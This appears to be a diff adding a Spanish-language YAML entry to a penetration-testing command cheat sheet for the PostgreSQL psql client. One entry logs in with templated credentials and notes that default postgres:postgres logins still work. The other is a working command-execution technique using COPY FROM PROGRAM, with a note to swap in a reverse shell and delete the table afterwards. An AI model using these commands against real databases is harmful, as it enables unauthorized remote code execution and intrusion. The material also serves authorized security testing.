@@ -1,0 +1,26 @@
+# Comandos del cliente psql (PostgreSQL).
+tool: psql
+area: otros
+url: https://www.postgresql.org/docs/current/app-psql.html
+commands:
+  - id: psql-login
+    title: Conectarse a PostgreSQL
+    cmd: |
+      PGPASSWORD='{{PASS}}' psql -h {{RHOST}} -U {{USER}} -d postgres
+    phase: enum
+    tags: [postgresql]
+    notes: >-
+      Dentro, \l lista las bases, \du los roles (Superuser es lo que buscas) y \dt las tablas de la
+      base actual. postgres:postgres sigue funcionando en más sitios de los que debería.
+    refs: [https://www.postgresql.org/docs/current/app-psql.html]
+
+  - id: psql-copy-program
+    title: Ejecutar comandos con COPY FROM PROGRAM
+    cmd: |
+      PGPASSWORD='{{PASS}}' psql -h {{RHOST}} -U {{USER}} -d postgres -c "CREATE TABLE IF NOT EXISTS p3i(o text); COPY p3i FROM PROGRAM 'id'; SELECT * FROM p3i;"
+    phase: initial-access
+    tags: [postgresql, rce]
+    notes: >-
+      Desde PostgreSQL 9.3, un superusuario (o el rol pg_execute_server_program) ejecuta comandos del
+      sistema como el usuario postgres. Cambia id por tu reverse shell y borra la tabla al terminar.
+    refs: [https://www.postgresql.org/docs/current/sql-copy.html]
